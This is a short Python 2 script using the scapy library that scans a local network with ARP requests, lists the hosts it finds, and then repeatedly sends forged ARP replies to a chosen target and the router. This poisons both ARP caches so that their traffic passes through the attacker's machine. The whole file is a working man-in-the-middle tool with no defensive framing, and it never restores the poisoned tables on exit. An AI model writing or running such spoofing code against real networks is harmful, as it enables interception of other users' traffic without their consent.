import scapy.all as scapy
import time


def scan_network():

    print "Perform Scanning : "

    ip = raw_input("Please Enter IP address : ")
    arp_request = scapy.ARP(pdst=ip)
    boradcast_macaddress = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = boradcast_macaddress / arp_request

    answered = scapy.srp(arp_packet, timeout=1)[0]

    print "ip" + "\t" * 4 + "mac" + "\t" * 4

    for answer in answered:

        target_dictionary[answer[1].psrc] = answer[1].hwsrc



    pass


def spoof_target(target_ip, spoof_ip):

    arp_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_dictionary[target_ip],psrc=spoof_ip)
    scapy.send(arp_packet,verbose=False)


    pass


def show_targets(target_dictionary):
    for ip, mac in target_dictionary.items():

        print ip +" : "+ mac +"\n"
    pass


if __name__ == '__main__':
    target_dictionary = {}
    scan_network()
    show_targets(target_dictionary)
    target_ip = raw_input("Please Enter Target IP: ")
    router_ip = raw_input("Please Enter Router ip: ")

    try:
        while True:
            spoof_target(target_ip, router_ip)
            spoof_target(router_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print "Quitting...."
        exit()